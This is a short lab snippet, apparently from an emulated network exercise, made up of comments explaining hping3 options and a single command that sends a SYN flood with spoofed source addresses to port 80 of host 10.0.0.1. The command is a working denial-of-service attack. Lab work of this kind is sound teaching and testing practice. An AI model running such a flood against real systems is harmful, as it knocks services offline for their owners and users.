# Execture in h3 terminal through xterm h3
# -S: SYN Flood; -p: target port number; -i: interval(period); --rand_source: spoof source IP; 
hping3 -S -p 80 -i 1 --flood --rand-source 10.0.0.1